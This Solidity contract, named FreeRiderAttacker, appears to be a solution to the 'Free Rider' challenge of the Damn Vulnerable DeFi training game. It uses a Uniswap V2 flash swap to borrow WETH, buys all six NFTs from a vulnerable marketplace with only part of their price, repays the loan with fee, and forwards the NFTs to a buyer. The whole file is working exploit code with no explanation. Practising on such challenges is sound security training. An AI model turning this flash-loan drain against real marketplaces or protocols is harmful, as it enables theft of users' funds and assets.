// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";
import "../DamnValuableNFT.sol";


contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee{

    FreeRiderNFTMarketplace market;
    DamnValuableNFT nft;
    WETH9 weth;
    address buyer;
    IUniswapV2Factory uniswapFactory;
    IUniswapV2Pair uniswapPair;

    constructor(
        address payable _market,
        address _nft,
        address payable _weth,
        address _buyer,
        address _uniswapFactory,
        address _uniswapPair
        ) payable {

        market = FreeRiderNFTMarketplace(_market);
        nft = DamnValuableNFT(_nft);
        weth = WETH9(_weth);
        buyer = _buyer;
        uniswapFactory = IUniswapV2Factory(_uniswapFactory);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
    }

    function attack(uint256 _amount) external {
        // https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol
        uniswapPair.swap(_amount, 0, address(this), "nothing");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        sender;amount1;data; // silence warning

        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == uniswapFactory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair

        // unwrap the weth
        weth.withdraw(amount0);

        // setup all 6 of NFTs
        uint256[] memory NFTs = new uint256[](6);
        for(uint256 i=0; i<6; i++){
            NFTs[i] = i;
        }

        // buy the NFTs using only 15ETH
        market.buyMany{value: amount0}(NFTs);

        // fee according to Uniswap: .003 / .997 = ~ 0.301% 
        // https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
        uint256 payBack = (amount0 * 100301) / 100000;

        // wrap the ETH back to WETH
        weth.deposit{value: payBack}();

        // reimburse the flash swap loan
        weth.transfer(msg.sender, payBack);

        // send nfts to buyer
        for(uint256 i = 0; i< 6; i++){
            nft.safeTransferFrom(address(this), buyer, NFTs[i]);
        }  

    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        override
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}